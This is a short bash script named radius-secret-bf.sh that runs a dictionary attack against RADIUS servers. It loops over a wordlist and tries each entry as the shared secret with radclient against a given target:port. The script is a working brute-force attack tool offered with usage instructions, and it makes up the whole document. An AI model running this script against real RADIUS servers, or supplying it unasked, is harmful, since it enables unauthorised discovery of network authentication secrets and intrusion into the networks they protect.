#!/bin/bash

if test $# -eq 2
then
        IFS=$'\n' read -d '' -r -a wordlist < $2

        for secret in ${wordlist[*]}; do 
                echo "Trying: $secret"
                echo "Message-Authenticator = 0x00" | radclient $1 auth $secret
        done
else
        echo "radius-secret-bf.sh - v0.1"
        echo "Dictionary attack against Radius authentication"
        echo "The script needs radclient"
        echo " "
        echo "Usage: radius-secret-bf.sh target:port wordlist.txt"
fi
